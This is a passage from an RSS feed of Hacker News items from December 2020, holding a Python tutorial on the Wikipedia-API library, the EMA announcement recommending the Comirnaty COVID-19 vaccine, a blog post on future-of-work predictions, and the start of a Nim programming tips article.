            <guid isPermaLink="false">hacker-news-small-sites-25495304</guid>
            <pubDate>Mon, 21 Dec 2020 14:39:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring Wikipedia with Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495282">thread link</a>) | @nanayaw1221
<br/>
December 21, 2020 | https://www.pythonstacks.com/blog/exploring-wikipedia-python/ | <a href="https://web.archive.org/web/*/https://www.pythonstacks.com/blog/exploring-wikipedia-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>In this short tutorial, you will learn to search, browse, and retrieve wiki data from Wikipedia.</p>

<p>For this, we will be using a python library called <span>Wikipedia-API</span> which is quite impressive. Wikipedia-API is an easy to use Python wrapper for <a href="https://www.mediawiki.org/wiki/API:Main_page" rel="nofollow">Wikipediaâ€™s</a> API. It supports extracting texts, sections, links, categories, translations, etc from Wikipedia.</p>

<p>It even allows you to retrieve the wiki information as HTML so that you could use it in web apps or websites.</p>



<p>We will begin by installing the library:</p>

<pre><code>pip install wikipedia-api</code></pre>



<h2>Searching Wikipedia</h2>

<p>Let's search for the term "Computer Programming"</p>

<pre><code>import wikipediaapi

wiki = wikipediaapi.Wikipedia('en')

page = wiki.page("Computer Programming")</code></pre>

<p>The <span>first line of code imports the<tt> wikipediaapi</tt></span> and the<span> second line creates a Wikipedia object</span>. The last line searches for the page on<em> "Computer Programming"</em> and returns a <span>WikipediaPage object </span>which is then stored in the <code>page</code> variable.</p>

<p>To check if the page exists:</p>

<pre><code>print(page.exists())          # True</code></pre>

<p><br>
To retrieve a page summary:</p>

<pre><code>print(page.summary)</code></pre>

<p><br>
For the full URL of the page:</p>

<pre><code>print(page.fullurl)           # https://en.wikipedia.org/wiki/Computer_programming</code></pre>



<h2>Extracting all information from the Wikipedia page.</h2>

<p>Ok, now let's do more like extracting the whole page in a text format. Putting it all together,</p>

<pre><code>import wikipediaapi

wiki = wikipediaapi.Wikipedia('en')

page = wiki.page("Computer Programming")

print("---------- title ----------")
print(page.title)

print("----------- Page URL ---------")
print(page.fullurl)

print("---------- summary ----------")
print(page.summary[:100])             # slicing summary
print()

print("---------- Main text information -----------")
print(page.text)</code></pre>

<p><br>
<strong><span>output:</span></strong></p>

<pre><code>---------- title ----------
Computer Programming
----------- Page URL ---------
https://en.wikipedia.org/wiki/Computer_programming
---------- summary ----------
Computer programming is the process of designing and building an executable computer program to acco

---------- Main text information -----------
Computer programming is the process of designing and building an executable 
computer program to accomplish a specific computing result or to perform a specific task. Programming involves tasks such as: analysis, generating algorithms, profiling algorithms
 accuracy and resource consumption...(it's more)</code></pre>



<p>Note that the <strong>main text information </strong>is a lot of information and I've truncated it here for simplicity.</p>



<h2>Extracting page in HTML</h2>

<p>To extract a wiki page in HTML, we must tweak our wiki object a little bit:</p>

<pre><code>import wikipediaapi

wiki_html = wikipediaapi.Wikipedia(language="en",
                                   extract_format=wikipediaapi.ExtractFormat.HTML)

page_html = wiki_html.page("Computer Programming")

print("---------- HTML ----------")
print(page_html.text)</code></pre>

<p><br>
<span><strong>output (truncated):</strong></span></p>

<pre><code>---------- HTML ----------
&lt;p class="mw-empty-elt"&gt;

&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Computer programming&lt;/b&gt; is the process of designing and building an executable computer program to accomplish a specific computing result or to perform a specific task. 
Programming involves tasks such as: analysis, generating algorithms, profiling algorithms' accuracy and resource consumption, and the implementation of algorithms in a chosen 
programming language (commonly referred to as &lt;b&gt;coding&lt;/b&gt;). The source code of a program is
 written in one or more languages that are intelligible to programmers, rather than machine code, which is directly executed by the central processing unit. 
The purpose of programming is to find a sequence of instructions that will automate the performance of a task (which can be as complex as an operating system) 
on a computer, often for solving a given problem. 
Proficient programming thus often requires expertise in several different subjects, including knowledge of the...(truncated)</code></pre>



<h2>How to get all Wikipedia pages under a category</h2>

<p>Wikipedia puts its pages under categories like Physics, Science, Programming, Medicine, Company, Celebrity, Countries, Books, etc.</p>

<p>To retrieve all pages in a particular category:</p>

<pre><code>import wikipediaapi

wiki_html = wikipediaapi.Wikipedia('en')

page = wiki_html.page("Category:Physics")

for c in page.categorymembers.values():
    print(c)</code></pre>

<p><strong>output</strong></p>

<pre><code>Physics (id: ??, ns: 0)
Outline of physics (id: ??, ns: 0)
Portal:Physics (id: ??, ns: 100)
Apriorics (id: ??, ns: 0)
Computational anatomy (id: ??, ns: 0)
Conformon (id: ??, ns: 0)
Diffeomorphometry (id: ??, ns: 0)
Dispersive medium (id: ??, ns: 0)
Galilean non-invariance of classical electromagnetism (id: ??, ns: 0)
Homeokinetics (id: ??, ns: 0)
...
...
...</code></pre>



<p>Well, that is it for this tutorial, this is useful when you want to use some data from Wikipedia inside your web applications or any programs you may write.</p>
        </div></div>]]>
            </description>
            <link>https://www.pythonstacks.com/blog/exploring-wikipedia-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495282</guid>
            <pubDate>Mon, 21 Dec 2020 14:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EMA recommends first Covid-19 vaccine for authorisation in the EU]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495167">thread link</a>) | @cookie0
<br/>
December 21, 2020 | https://www.ema.europa.eu/en/news/ema-recommends-first-covid-19-vaccine-authorisation-eu | <a href="https://web.archive.org/web/*/https://www.ema.europa.eu/en/news/ema-recommends-first-covid-19-vaccine-authorisation-eu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
          <div>
    <div>
              <div>


<div>
          <div>
              <div><div><p><span>Update:</span>&nbsp;Comirnaty is now authorised across the EU. This follows the granting of a conditional&nbsp;<a href="https://www.ema.europa.eu/en/glossary/marketing-authorisation" id="glossary-term-43236" target="_blank" title="The approval to market a medicine in one, several or all European Union Member States.">marketing authorisation</a> by the European Commission on 21 December 2020.&nbsp;</p></div><p>EMA has recommended granting a <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a> for the vaccine <a href="https://www.ema.europa.eu/en/medicine/summary-opinion/comirnaty-pending-ec-decision" target="_self">Comirnaty</a>, developed by BioNTech and Pfizer, to prevent coronavirus disease 2019 (COVID-19) in people from 16 years of age. EMAâ€™s scientific opinion paves the way for the first <a href="https://www.ema.europa.eu/en/glossary/marketing-authorisation" id="glossary-term-43236" target="_blank" title="The approval to market a medicine in one, several or all European Union Member States.">marketing authorisation</a> of a COVID-19 vaccine in the EU by the European Commission, with all the safeguards, controls and obligations this entails.</p><p>EMAâ€™s human medicines committee (<a href="https://www.ema.europa.eu/en/glossary/chmp" id="glossary-term-43090" target="_blank" title="Committee for Medicinal Products for Human Use -  the committee that is responsible for preparing the Agency's opinions on questions concerning human medicines.&nbsp;  More information can be found under 'Committee for Medicinal Products for Human Use (CHMP)'.">CHMP</a>) has completed its rigorous evaluation of Comirnaty, concluding by consensus that sufficiently robust data on the quality, safety and <a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">efficacy</a> of the vaccine are now available to recommend a formal <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a>. This will provide a controlled and robust framework to underpin EU-wide vaccination campaigns and protect EU citizens.</p><p>â€œTodayâ€™s positive news is an important step forward in our fight against this pandemic, which has caused suffering and hardship for so many,â€ said Emer Cooke, Executive Director of EMA. â€œWe have achieved this milestone thanks to the dedication of scientists, doctors, developers and trial volunteers as well as many experts from all EU Member States.</p><p>â€œOur thorough evaluation means that we can confidently assure EU citizens of the safety and <a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">efficacy</a> of this vaccine and that it meets necessary quality standards.&nbsp;However, our work does not stop here. We will continue to collect and analyse data on the safety and effectiveness of this vaccine to protect people taking the vaccine in the EU.â€</p><p>A very large <a href="https://www.ema.europa.eu/en/glossary/clinical-trial" id="glossary-term-43092" target="_blank" title="A study performed to investigate the safety or efficacy of a medicine. For human medicines, these studies are carried out in human volunteers.">clinical trial</a> showed that Comirnaty was effective at preventing COVIDâ€‘19 in people from 16 years of age.</p><p>The trial involved around 44,000 people in total. Half received the vaccine and half were given a dummy injection. People did not know whether they received the vaccine or the dummy injection.</p><p><a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">Efficacy</a> was calculated in over 36,000 people from 16 years of age (including people over 75 years of age) who had no sign of previous infection. The study showed a 95% reduction in the number of symptomatic COVID-19 cases in the people who received the vaccine (8 cases out of 18,198 got COVID-19 symptoms) compared with people who received a dummy injection (162 cases out of 18,325 got COVID-19 symptoms). This means that the vaccine demonstrated a 95% <a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">efficacy</a> in the <a href="https://www.ema.europa.eu/en/glossary/clinical-trial" id="glossary-term-43092" target="_blank" title="A study performed to investigate the safety or efficacy of a medicine. For human medicines, these studies are carried out in human volunteers.">clinical trial</a>.</p><p>The trial also showed around 95% <a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">efficacy</a> in the participants at risk of severe COVID-19, including those with asthma, chronic lung disease, diabetes, high blood pressure or a body mass index â‰¥&nbsp;30&nbsp;kg/m2. The high <a href="https://www.ema.europa.eu/en/glossary/efficacy" id="glossary-term-43193" target="_blank" title="The measurement of a medicine's desired effect under ideal conditions, such as in a clinical trial.">efficacy</a> was maintained across genders, racial and ethnic groups.</p><p>Comirnaty is given as two injections into the arm, at least 21 days apart.&nbsp;The most common side effects with Comirnaty were usually mild or moderate and got better within a few days after vaccination. They included pain and swelling at the injection site, tiredness, headache, muscle and joint pain, chills and fever. The safety and effectiveness of the vaccine will continue to be monitored as it is used across the Member States, through the <a href="https://www.ema.europa.eu/en/documents/other/pharmacovigilance-plan-eu-regulatory-network-covid-19-vaccines_en.pdf">EU pharmacovigilance system</a> and additional studies by the company and by European authorities.</p><p><strong>Where to find more information</strong></p><p>The <a href="https://www.ema.europa.eu/en/glossary/product-information" id="glossary-term-43231" target="_blank" title="Documents providing officially approved information for healthcare professionals and patients on a medicine. The product information includes the summary of product characteristics, package leaflet and labelling.&nbsp;  More information can be found under&nbsp;'Product-information requirements'.">product information</a>&nbsp;approved by the <a href="https://www.ema.europa.eu/en/glossary/chmp" id="glossary-term-43090" target="_blank" title="Committee for Medicinal Products for Human Use -  the committee that is responsible for preparing the Agency's opinions on questions concerning human medicines.&nbsp;  More information can be found under 'Committee for Medicinal Products for Human Use (CHMP)'.">CHMP</a> for Comirnaty contains prescribing information for healthcare professionals, a <a href="https://www.ema.europa.eu/en/glossary/package-leaflet" id="glossary-term-43212" target="_blank" title="The leaflet in every pack of medicine that contains information on the medicine for end-users, such as patients and animal owners.">package leaflet</a> for members of the public and details of conditions of the vaccineâ€™s authorisation.</p><p>An assessment report, with details of EMAâ€™s evaluation of Comirnaty, and the full <a href="https://www.ema.europa.eu/en/glossary/risk-management-plan" id="glossary-term-43172" target="_blank" title="A detailed description of the activities and interventions designed to identify, characterise, prevent or minimise risks relating to medicines.">risk management plan</a> will be published within days. <a href="https://www.ema.europa.eu/en/glossary/clinical-trial" id="glossary-term-43092" target="_blank" title="A study performed to investigate the safety or efficacy of a medicine. For human medicines, these studies are carried out in human volunteers.">Clinical trial</a> data submitted by the company in the application for <a href="https://www.ema.europa.eu/en/glossary/marketing-authorisation" id="glossary-term-43236" target="_blank" title="The approval to market a medicine in one, several or all European Union Member States.">marketing authorisation</a> will be published on the Agencyâ€™s <a href="https://clinicaldata.ema.europa.eu/web/cdp/home">Clinical data website</a> in due course.</p><p>More information is available in <a href="https://www.ema.europa.eu/en/medicines/human/summaries-opinion/comirnaty">an overview of the vaccine in lay language</a>, including a description of the vaccineâ€™s benefits and risks and why EMA recommended its authorisation in the EU.</p><p><strong>How Comirnaty works</strong></p><p>Comirnaty works by preparing the body to defend itself against COVID-19. It contains a molecule called messenger RNA (mRNA) which has instructions for making the spike protein. This is a protein on the surface of the SARS-CoV-2 virus which the virus needs to enter the bodyâ€™s cells.</p><p>When a person is given the vaccine, some of their cells will read the mRNA instructions and temporarily produce the spike protein. The personâ€™s immune system will then recognise this protein as foreign and produce antibodies and activate T cells (white blood cells) to attack it.</p><p>If, later on, the person comes into contact with SARS-CoV-2 virus, their immune system will recognise it and be ready to&nbsp;defend the body against it.</p><p>The mRNA from the vaccine does not stay in the body but is broken down shortly after vaccination.</p><p><strong><a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">Conditional marketing authorisation</a></strong></p><p>A <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a> is one of EUâ€™s regulatory mechanisms for facilitating early access to medicines that fulfil an unmet medical need, including in emergency situations such as the current pandemic.</p><p>A <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a> is a formal authorisation of the vaccine, covering all batches produced for the EU and providing a robust assessment to underpin vaccination campaigns.</p><p>As Comirnaty is recommended for a <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a>, the company that markets Comirnaty will continue to provide results from the main trial, which is ongoing for 2 years. This trial and additional studies will provide information on how long protection lasts, how well the vaccine prevents severe COVID-19, how well it protects immunocompromised people, children and pregnant women, and whether it prevents asymptomatic cases.</p><p>The company will also carry out studies to provide additional assurance on the pharmaceutical quality of the vaccine as the manufacturing continues to be scaled up.</p><p><strong>Monitoring the safety of Comirnaty</strong></p><p>In line with the EUâ€™s <a href="https://www.ema.europa.eu/en/news/ema-publishes-safety-monitoring-plan-guidance-risk-management-planning-covid-19-vaccines">safety monitoring plan for COVID-19 vaccines</a>, Comirnaty will be closely monitored and subject to several activities that apply specifically to COVID-19 vaccines. Although large numbers of people have received COVID-19 vaccines in <a href="https://www.ema.europa.eu/en/glossary/clinical-trial" id="glossary-term-43092" target="_blank" title="A study performed to investigate the safety or efficacy of a medicine. For human medicines, these studies are carried out in human volunteers.">clinical trials</a>, certain side effects may only emerge when millions of people are vaccinated.</p><p>Companies are required to provide monthly safety reports in addition to the regular updates required by the legislation and conduct studies to monitor the safety and effectiveness of the vaccines as they are used by the public. Authorities will also conduct additional studies to monitor the vaccines.</p><p>These measures will allow regulators to swiftly assess data emerging from a range of different sources and take appropriate regulatory action to protect public health if needed.</p><p><strong>Assessment of Comirnaty</strong></p><p>During the assessment of Comirnaty, the <a href="https://www.ema.europa.eu/en/glossary/chmp" id="glossary-term-43090" target="_blank" title="Committee for Medicinal Products for Human Use -  the committee that is responsible for preparing the Agency's opinions on questions concerning human medicines.&nbsp;  More information can be found under 'Committee for Medicinal Products for Human Use (CHMP)'.">CHMP</a> had the support of <a href="https://www.ema.europa.eu/en/committees/pharmacovigilance-risk-assessment-committee-prac">EMAâ€™s safety committee, PRAC</a>, who assessed the <a href="https://www.ema.europa.eu/en/glossary/risk-management-plan" id="glossary-term-43172" target="_blank" title="A detailed description of the activities and interventions designed to identify, characterise, prevent or minimise risks relating to medicines.">risk management plan</a> of Comirnaty, and the <a href="https://www.ema.europa.eu/en/human-regulatory/overview/public-health-threats/coronavirus-disease-covid-19/emas-governance-during-covid-19-pandemic#covid-19-ema-pandemic-task-force-section">COVID-19 EMA pandemic task force (COVID-ETF)</a>, a group that brings together experts from across the <a href="https://www.ema.europa.eu/en/glossary/european-medicines-regulatory-network" id="glossary-term-43201" target="_blank" title="The system for regulating medicines in Europe is based on a closely coordinated regulatory network of national competent authorities in the Member States of the European Economic Area working together with the European Medicines Agency and the European Commission.&nbsp;  More information can be found under 'European medicines regulatory network'.">European medicines regulatory network</a> to facilitate rapid and coordinated regulatory action on medicines and vaccines for COVID-19.</p><p>The European Commission will now fast-track the decision-making process to grant a decision on the <a href="https://www.ema.europa.eu/en/glossary/conditional-marketing-authorisation" id="glossary-term-43109" target="_blank" title="The approval of a medicine that addresses unmet medical needs of patients on the basis of less comprehensive data than normally required. The available data must indicate that the medicineâ€™s benefits outweigh its risks and the applicant should be in a position to provide the comprehensive clinical data in the future.&nbsp;More information can be found under 'Conditional marketing authorisation'.">conditional marketing authorisation</a> for Comirnaty, allowing&nbsp;vaccination programmes to be rolled out across the EU.</p></div>
          </div>
  </div>

</div>
          </div>
  </div>
    </div>
</div></div>]]>
            </description>
            <link>https://www.ema.europa.eu/en/news/ema-recommends-first-covid-19-vaccine-authorisation-eu</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495167</guid>
            <pubDate>Mon, 21 Dec 2020 14:23:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predictions for Making Money in 2021 and Beyond]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25495119">thread link</a>) | @ericvanular
<br/>
December 21, 2020 | https://ericvanular.com/future-of-work/ | <a href="https://web.archive.org/web/*/https://ericvanular.com/future-of-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>2020 has brought permanent change to the working world and the way that economic incentives are pointed. Letâ€™s walk through how the effects weâ€™re starting to see today will reward those who can position themselves well. A vaccine is starting to be deployed as of the time of writing and we can imagine how a post COVID world will play out. Having worked with data for some time, I can confidently say that forecasting is generally wrong for most things - <em>but forecasts that anticipate how incentives will affect behaviour are usually right</em>.</p>
<h3 id="the-concept-of-distinct-countries-is-starting-to-crack"><a href="#the-concept-of-distinct-countries-is-starting-to-crack" aria-label="the concept of distinct countries is starting to crack permalink"></a>The concept of distinct countries is starting to crack.</h3>
<p>Everyday people have never had so much individual freedom and autonomy. The immense but quiet transition happening is the world moving away from geography-based local economies to a single global cyber-based economy. Profound implications result from this tectonic shift. </p>
<p>An increase in human mobility across borders will mean that skilled individuals will move to wherever suits them best at that point in time. Personal quality of life considerations will weigh heavily into this, favouring lower cost of living locales with good weather, culture, and social opportunities. Countries with high taxation will see brain drain and capital flight in increasing amounts. When money can be earned anywhere, you wonâ€™t be obligated to subjugate yourself to high taxes. Rather than being tied to the work opportunities in your local city, you can live in one country and be employed in another, using financial arbitrage to your advantage. Of course, this only works for those who can work online - any career relating to physical goods or services will remain local. The flipside of this is that you now compete globally for work! Companies that donâ€™t offer remote work will lose the talent war and wonâ€™t be able to draw the â€œA Playersâ€ they seek. The age of the sovereign individual is here. In an extreme example, it is possible to declare tax non-residency from your home country, instead choosing to be taxed in a nation state with minimal or no tax requirements - potentially avoiding paying taxes altogether. Governments that charge too much will drive away their best customers. The digital nomad movement is a prime example of this. The nation-state will not endure these changes in its present form. </p>
<p><strong>For greater future flexibility and options, you should do everything that you can to make your career remote. It will give you much more career capital and let you work with the most successful people.</strong></p>
<h3 id="introducing-you-incorporated"><a href="#introducing-you-incorporated" aria-label="introducing you incorporated permalink"></a>Introducing "You, Incorporated"...</h3>
<p>One change that has been accelerated is the trend of rapidly changing jobs rather than having a long career in one company. The incentives are increasingly against those who stay in their jobs for more than a few years. Performance evaluations, corporate politics, wage structures all advantage those who jump between opportunities more often. The corporate ladder is now more diagonal for those with the highest aspirations. Nothing here is a revolutionary prediction but here is what is: <strong>eventually the idea of having a job will go away altogether</strong>. The late game of this trend is that employees will become companies of one - independent contractors for contracted services. Your financial success will be completely dependent on your ability to provide goods or services that actually provide value. â€œWhat are you working on right now?â€ will be a more relevant question than â€œwhat do you do?â€. The days of irrelevant paper-pushing jobs are numbered - eventually automation and technology will trim most of the fat from all but the biggest companies. </p>
<p><strong>To get an advantage, start looking at yourself as a company of one today. Start thinking about exactly why a business would pay you, not in terms of the skills you possess but because of the revenue you bring in or the costs you cut.</strong></p>
<h3 id="get-skilled--get-focused"><a href="#get-skilled--get-focused" aria-label="get skilled  get focused permalink"></a>Get Skilled &amp; Get Focused</h3>
<p>A lot of these changes are going to be acutely painful for unskilled workers. Iâ€™m sure youâ€™ve noticed that the middle class is disappearing quickly. At some point, this could reach a boil and prompt strong negative reactions from those who are underemployed due to automation. There could be a widespread push back against those leveraging technology. We are already seeing the beginnings of this today but the momentum is continuing in this direction. Main Street businesses have been decimated by COVID and have concentrated power even more in the tech giantsâ€™ hands. Itâ€™s hard to predict how this ends when so much of the global power is concentrated in the hands of so few. The economy runs fine when there is a relatively wealthy middle class who keep it moving but we are entering the age of exclusively haves and have-nots. We could see large political movements rise up to tackle the issue with regulation. We could also see a larger subset of people opting out of the default working arrangements. </p>
<p><strong>If you want to avoid being on the wrong side of this widening chasm, it is time to double down on a skill that is in demand today. Ignore most other things. Programming, effective business writing, digital distribution, and video making are all very in demand skill sets as a starting point.</strong></p>
<h3 id="businesses-are-harder-to-track-online"><a href="#businesses-are-harder-to-track-online" aria-label="businesses are harder to track online permalink"></a>Businesses Are Harder To Track Online</h3>
<p>Information is power. Those who have it will win, those who donâ€™t will lose. In parallel, technology is getting faster and more capable. If your business is not online, it does not exist. This is going to make it harder for governments to track business activity, again undermining their strength. Cryptocurrencies feed directly into this. As more money moves online, governments wonâ€™t be able to track or control it anymore. Theyâ€™ll lose their power over commerce and wonâ€™t be able to treat their citizens as revenue sources. They also have the ability to erode savings held in fiat currencies through inflation and money printing. Part of the appeal of digital currencies is the hedge against inflation, though there are still many barriers to their widespread use for transactions. Digital businesses having a country of origin will largely lose meaning.</p>
<h2 id="so-what-can-i-do-today-to-help-my-future-self"><a href="#so-what-can-i-do-today-to-help-my-future-self" aria-label="so what can i do today to help my future self permalink"></a>So What Can I Do Today To Help My Future Self?</h2>
<p><strong>In the future, wealth will be measured by your ability to structure your affairs to complete individual autonomy and independence.</strong> </p>
<p>For some, there will be unprecedented financial independence in the new economy based on information. There is no doubt that the cyber economy is the greatest economic phenomenon in history so far. It enables infinite leverage. As access to technology grows and becomes more accessible, we can multiply our abilities as individuals by getting computers to complete tasks for us. </p>
<p><strong>For you to place yourself in a good spot, you need to focus on finding a point of leverage somewhere. Leverage means reaching more customers with less work. Tools that give you leverage include code (servers work for you), money (can be invested to earn compound returns), and media (create once, distribute forever). Would-be millionaires need to identify and capitalize on their specific points of leverage.</strong></p>
<blockquote>
<p>If you can teach yourself to solve problems, you have a bright career ahead. No matter where you live, you will find problems galore in need of solving. Those who would benefit from solutions to their problems, will pay you handsomely to solve them.</p>
</blockquote></div><p>I write about how you can improve your life, technology, &amp; saving the planet. Keep up with new posts. Unsubscribe whenever. I promise I won't spam you.</p></div>]]>
            </description>
            <link>https://ericvanular.com/future-of-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495119</guid>
            <pubDate>Mon, 21 Dec 2020 14:18:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nim Apocrypha, Vol. I]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25495098">thread link</a>) | @johnnovak
<br/>
December 21, 2020 | https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/ | <a href="https://web.archive.org/web/*/https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

    

    <div role="main">



<article>
  <header>
    
    <p><time datetime="2020-12-21">2020 Dec 21</time></p>
  </header>

  
    <nav>
      <ul>
      
        <li><a href="https://blog.johnnovak.net/tag/coding/">coding</a></li>
      
        <li><a href="https://blog.johnnovak.net/tag/nim/">nim</a></li>
      
      </ul>
    </nav>
  

  


<ul id="markdown-toc">
  <li><a href="#intro" id="markdown-toc-intro">Intro</a></li>
  <li><a href="#i--the-not-so-obvious" id="markdown-toc-i--the-not-so-obvious">I â€” The Not-So-Obvious</a>    <ul>
      <li><a href="#1--reducing-executable-size-by-stripping-debug-symbols" id="markdown-toc-1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</a></li>
      <li><a href="#2--release-builds-with-exception-logging" id="markdown-toc-2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</a></li>
      <li><a href="#3--switching-to-arcorc" id="markdown-toc-3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</a></li>
      <li><a href="#4--executable-icons-on-windows-mingw" id="markdown-toc-4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</a></li>
      <li><a href="#5--debug-echo-in-windows-gui-programs-mingw" id="markdown-toc-5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</a></li>
    </ul>
  </li>
  <li><a href="#ii--the-hidden" id="markdown-toc-ii--the-hidden">II â€” The Hidden</a>    <ul>
      <li><a href="#6--using-keyword" id="markdown-toc-6--using-keyword">6 &nbsp; â€˜usingâ€™ keyword</a></li>
      <li><a href="#7--opening-urls-in-the-default-browser" id="markdown-toc-7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</a></li>
      <li><a href="#8--cross-platform-home-and-config-directories" id="markdown-toc-8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</a></li>
      <li><a href="#9--debug-dumping-expressions" id="markdown-toc-9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</a></li>
      <li><a href="#10--measuring-elapsed-time" id="markdown-toc-10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</a></li>
      <li><a href="#11--dealing-with-openarrays" id="markdown-toc-11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</a></li>
    </ul>
  </li>
  <li><a href="#iii--the-crafty" id="markdown-toc-iii--the-crafty">III â€” The Crafty</a>    <ul>
      <li><a href="#12--easy-pointer-manipulations" id="markdown-toc-12--easy-pointer-manipulations">12 &nbsp; Easy pointer manipulations</a></li>
      <li><a href="#13--taming-circular-type-dependencies" id="markdown-toc-13--taming-circular-type-dependencies">13 &nbsp; Taming circular type dependencies</a></li>
      <li><a href="#14--with-macro" id="markdown-toc-14--with-macro">14 &nbsp; â€˜withâ€™ macro</a></li>
      <li><a href="#15--aliases" id="markdown-toc-15--aliases">15 &nbsp; Aliases</a></li>
    </ul>
  </li>
  <li><a href="#iv--the-grand-finale" id="markdown-toc-iv--the-grand-finale">IV â€” The Grand Finale</a>    <ul>
      <li><a href="#16--saving-memory-by-object-field-reordering" id="markdown-toc-16--saving-memory-by-object-field-reordering">16 &nbsp; Saving memory by object field reordering</a>        <ul>
          <li><a href="#the-enigma" id="markdown-toc-the-enigma">The Enigma</a></li>
          <li><a href="#the-explanation" id="markdown-toc-the-explanation">The Explanation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#outro" id="markdown-toc-outro">Outro</a></li>
</ul>

<h2 id="intro">Intro</h2>

<p>Greetings fellow Nim adventurers! Below you will find 16 handy Nim tips
&amp; tricks I came across while developing a medium-sized GUI program this year,
<a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
(<a href="https://github.com/johnnovak/koi">and</a>
<a href="https://github.com/johnnovak/nim-riff">related</a>
<a href="https://github.com/johnnovak/nim-binstreams">libraries</a>).  Some of them are
about less known or undocumented Nim features or standard library functions,
a few are workarounds for some rough edges of the language, and thereâ€™s also
a handful of useful techniques I read about in forums or have invented on my
own.</p>

<p>All tips are for Nim 1.4.2 and beyond, and most are applicable to the
C backend. I hope youâ€™ll find something useful here that will make your time
with Nim more enjoyable and productive!</p>

<h2 id="i--the-not-so-obvious">I â€” The Not-So-Obvious</h2>

<h3 id="1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</h3>

<p>Nim touts itself as a language capable of generating small native binaries.
But just naively compiling some program with <code>nim c -d:release</code> and looking at
the file sizes will make you wonder about the validity of that claim!</p>

